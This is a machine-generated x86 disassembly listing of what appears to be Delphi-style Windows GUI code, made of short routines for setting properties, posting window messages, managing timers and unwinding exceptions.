mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40339c
mov edx esi
call sub_467ca8
pop esi
pop ebx
retn
sub_467da4
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_467f8c
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_418e20
mov ecx eax
sub_46817c
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4681e4
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_46858c
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_4685c0
sub_4685c0
mov edx sub_468598
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_4656e8
retn
sub_4687aa
jmp sub_403980
sub_4687b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468c48
jmp sub_403980
sub_468c87
jmp sub_403980
sub_468c8e
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468e2c
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_468f68
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4033e8
pop esi
pop ebp
retn 0x8
sub_468f84
mov eax [ eax + 0x34 ]
call sub_4661bc
retn
sub_468f90
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4033e8
pop esi
retn
sub_468fcc
push ebx
mov ecx sub_468fa4
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4656e8
pop ebx
retn
sub_469200
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_469214
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_469349
jmp sub_4036cc
sub_46944b
jmp sub_403980
sub_469476
jmp sub_403980
sub_46947d
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_469494
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_46967c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_468fcc
sub_4696fc
jmp sub_403980
sub_469740
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_469758
push ebx
mov ebx eax
mov eax ebx
call sub_42173c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_4697aa
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_468fcc
sub_469820
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_469969
jmp sub_403980
sub_469970
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_469bb0
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_469bc0
sub_469c14
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_469c24
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_469c34
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_469c44
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_469c54
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_469ccc
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_466014
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_466014
retn
sub_469ce8
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_466014
sub_469d30
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_468f84
retn
mov eax edx
retn
sub_469ddc
mov [ eax + 0x58 ] edx
call sub_469d04
retn
sub_469e12
jmp sub_4036cc
sub_469e17
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a17d
jmp sub_403980
sub_46a184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
sub_46a19a
jmp sub_403980
sub_46a29b
jmp sub_403980
sub_46a2a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a2bf
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
sub_46a2b8
jmp sub_403980
sub_46a2dd
jmp sub_403980
sub_46a367
jmp sub_403980
sub_46a36e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a3a0
push ebx
mov ebx eax
mov eax ebx
call sub_418f60
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_4224ec
sub_46a464
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_46a478
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_46a480
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_46a845
jmp sub_403980
sub_46a84c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a94c
jmp sub_403980
sub_46a953
pop ebp
retn
sub_46c794
mov eax [ rw-data ]
retn
sub_46c79c
mov [ rw-data ] eax
retn
sub_46c8e4
jmp sub_4036cc
sub_46c91b
jmp sub_403980
sub_46c922
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46caf0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42237c
pop ebp
retn 0x8
sub_46cb04
call sub_422414
retn
sub_46cc46
jmp sub_403980
sub_46cc4d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ccf1
jmp sub_403980
sub_46ccf8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cd88
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_46d4b4
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_46db60
sub_46d4d0
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_46d4b4
sub_46d5f0
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_46db60
sub_46d608
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_46db60
sub_46d620
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_46db60
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_46d64c
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_46d658
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_46db60
retn
sub_46d938
push ebx
mov ebx edx
mov edx ebx
call sub_4591d4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_46d9a8
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_46dad0
jmp sub_403980
sub_46dad7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dae0
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_46ceec
mov eax [ ebx + 0x20c ]
call sub_46ceec
sub_46db40
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46db50
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46dc4b
jmp sub_403980
sub_46dc58
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_46dc70
sub_46de8c
retn
sub_46defa
jmp sub_403980
sub_46df39
jmp sub_403980
sub_46df6c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_45a6cc
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_46d178
retn
sub_46df90
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_45a6ec
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_46d178
retn
sub_46e085
jmp sub_403980
sub_46e08c
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_46cde0
mov eax [ ebp - 0x4 ]
call sub_46db60
sub_46e1c0
jmp sub_403980
sub_46e1f8
jmp sub_403980
sub_46e1ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e21f
lea eax [ ebp - 0x114 ]
call sub_403f7c
retn
sub_46e218
jmp sub_403980
sub_46e21f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e526
jmp sub_403980
sub_46e52d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a0
sub_46e581
jmp sub_4036cc
sub_46e5fd
jmp sub_4036cc
sub_46e602
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e9ba
jmp sub_403980
sub_46e9c1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ea9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d540
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_46eab4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46eaec
mov edx eax
mov eax esi
call sub_41f758
pop esi
pop ebx
retn
sub_46ead0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46fe90
mov edx eax
mov eax esi
call sub_41f758
pop esi
pop ebx
retn
sub_46eaec
push ebx
mov ebx eax
mov eax ebx
call sub_46fb30
mov edx r-xdata
call sub_4255b4
pop ebx
retn
sub_46ebf0
push ebx
mov ebx eax
mov eax ebx
call sub_46ec00
xor al 0x1
pop ebx
retn
sub_46ec00
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_46ec5c
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_46ec7c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_46ec9c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_46ef95
jmp sub_403980
sub_46ef9c
pop ecx
pop ebp
retn
sub_46efa0
xor eax eax
retn
sub_46f278
jmp sub_403980
sub_46f27f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_46f295
jmp sub_403980
sub_46f37f
jmp sub_403980
sub_46f386
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f3a3
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_46f39c
jmp sub_403980
sub_46f3c3
jmp sub_403980
sub_46f6ae
jmp sub_403980
sub_46f841
jmp sub_403980
sub_46fb30
mov eax [ eax + 0x238 ]
retn
sub_46fb38
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46fb44
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_46fe82
jmp sub_403980
sub_46fe89
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46fe90
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_46fed8
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4598e8
sub_46fef4
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_46ff30
push ebx
mov ebx eax
mov eax ebx
call sub_45b87c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424f74
sub_46ffb4
push ebx
mov ebx eax
mov eax ebx
call sub_45b8a4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_425658
sub_46ffd4
push ebx
mov ebx eax
mov eax ebx
call sub_46fbf4
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_46fcbc
pop ebx
retn
sub_470801
lea eax [ ebp - 0xb4 ]
call sub_403f7c
retn
sub_47080d
jmp sub_403980
j_sub_470801
jmp sub_470801
sub_470814
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47096c
jmp sub_403980
sub_470973
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470c58
jmp sub_403980
sub_470c5f
mov eax [ rw-data ]
call sub_473510
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470c76
add [ eax ] al
retn
sub_470ed4
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_470ef4
mov eax [ eax + 0x240 ]
call sub_42b8e8
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_4752b0
sub_470f9b
jmp sub_403980
sub_470fa2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470fc5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425630
retn
sub_470fbe
jmp sub_403980
sub_470fc5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471184
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_470ef4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4713ec
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_469138
sub_4714d7
jmp sub_403980
sub_4714de
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4714e4
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_470ccc
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_47153c
call sub_472264
retn
sub_471989
jmp sub_403980
sub_471990
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471c8c
jmp sub_4036cc
sub_472028
jmp sub_4036cc
sub_472121
jmp sub_403980
sub_472128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472145
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_47213e
jmp sub_403980
sub_472145
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47214c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42b8e8
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46eb94
sub_47216c
call sub_4031ec
retn
sub_4721c4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_47222a
jmp sub_403980
sub_4723d8
jmp sub_4036cc
sub_472404
xor edx edx
call sub_46eef8
retn
sub_47240c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_46eef8
mov eax ebx
call sub_455cac
pop ebx
retn
sub_472492
jmp sub_403980
sub_472499
pop ebx
pop ecx
pop ebp
retn
sub_4724a0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_45c380
push eax
call PostMessageA
pop ebx
retn
sub_4726a4
jmp sub_403980
sub_472745
jmp sub_403980
sub_47274f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47276e
mov eax [ rw-data ]
call sub_474988
retn
sub_472767
jmp sub_403980
sub_47276e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47278b
lea eax [ ebp - 0x20 ]
call sub_403f7c
retn
sub_472784
jmp sub_403980
sub_47278b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47286c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_454e58
retn
mov edx eax
mov eax [ rw-data ]
call sub_473fdc
retn
sub_472bf0
mov edx eax
mov eax [ rw-data ]
call sub_4759fc
mov al 0x1
retn
sub_472cd8
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_472c00
sub_472cec
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_472c00
sub_472d00
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_472c00
sub_472d14
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_472c00
sub_472d28
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_472e93
jmp sub_403980
sub_472e9a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472ea0
push ebx
mov ebx eax
mov eax ebx
call sub_45ac60
mov eax ebx
call sub_45ade4
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4724a0
sub_473116
jmp sub_403980
sub_47311d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473124
push ebx
mov ebx edx
mov edx ebx
call sub_45b0c8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_454f60
pop ebx
retn
sub_473178
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4731e0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_473190
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4731e0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4731ac
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4731e0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4731c4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4731e0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_473460
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47346c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473478
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473484
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473490
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47349c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4734a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_418dc4
pop esi
pop ebx
retn
sub_4734bc
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4734d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418dc4
pop esi
pop ebx
retn
sub_4734ec
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_4734f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
pop esi
pop ebx
retn
sub_473508
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_4735e4
mov eax [ eax + 0x54 ]
call sub_418c68
retn
sub_4735f0
mov eax [ eax + 0x54 ]
call sub_418f60
retn
sub_473843
jmp sub_403980
sub_473887
jmp sub_403980
sub_47388e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4738dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4736dc
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403fd0
pop esi
pop ebx
retn
sub_473948
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_418dc4
pop esi
pop ebx
retn
sub_47395c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_473b61
jmp sub_403980
sub_473b68
pop ebx
mov esp ebp
pop ebp
retn
sub_473b70
inc [ eax + 0x8c ]
retn
sub_473b78
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_473b98
sub_473b98
xor edx edx
call sub_473fdc
retn
sub_473fce
jmp sub_403980
sub_474055
jmp sub_403980
sub_474064
add eax 0x30
call sub_40d538
retn
sub_4740a8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_4740f9
jmp sub_4036cc
sub_4740fe
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4747cd
jmp sub_403980
sub_4747d4
pop ebx
mov esp ebp
pop ebp
retn
sub_47495c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_474988
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4749b4
xor edx edx
call sub_4748ac
retn
sub_4749bc
mov dl 0x1
call sub_4748ac
retn
sub_474a30
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_474a48
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_474b15
jmp sub_403980
sub_474b1c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475266
jmp sub_4036cc
sub_475864
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4036cc#9
jmp sub_4036cc
j_sub_4036cc#8
jmp sub_4036cc
sub_4759da
jmp sub_403980
sub_4759e1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4759e8
call sub_40d088
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_475be1
jmp sub_403980
sub_475be8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_475caf
jmp sub_403980
sub_475cb6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475e8c
jmp sub_403980
sub_475e93
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475ef4
jmp sub_403980
sub_475efb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475f04
call sub_475ccc
retn
sub_4760ef
jmp sub_4036cc
sub_476148
jmp sub_403980
sub_47614f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47627d
jmp sub_403980
sub_4763dc
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4766db
jmp sub_403980
sub_47670a
jmp sub_403980
sub_476816
jmp sub_403980
sub_47681d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476bae
jmp sub_403980
sub_476bb5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476bf8
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_476d28
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_476d73
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_476d84
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_476d94
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_476e07
jmp sub_403980
sub_476e0e
pop ebp
retn
sub_476e10
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_476da4
call sub_403d50
call sub_476d28
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_46ca70
call sub_41872c
sub_476ea0
retn
sub_476ea1
jmp sub_403980
j_sub_476ea0
jmp sub_476ea0
sub_476ea8
pop ebp
retn
sub_476eac
sub [ rw-data ] 0x1
retn
sub_477117
jmp sub_403980
sub_4771b2
jmp sub_403980
sub_4771d8
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_477070
call sub_4039b8
pop ebx
retn
sub_4773e0
jmp sub_403980
sub_4773e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47748c
jmp sub_403980
sub_477493
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47753e
jmp sub_403980
sub_477545
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477750
jmp sub_403980
sub_477757
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477a70
jmp sub_403980
sub_477a77
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477a9a
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_4049b8
retn
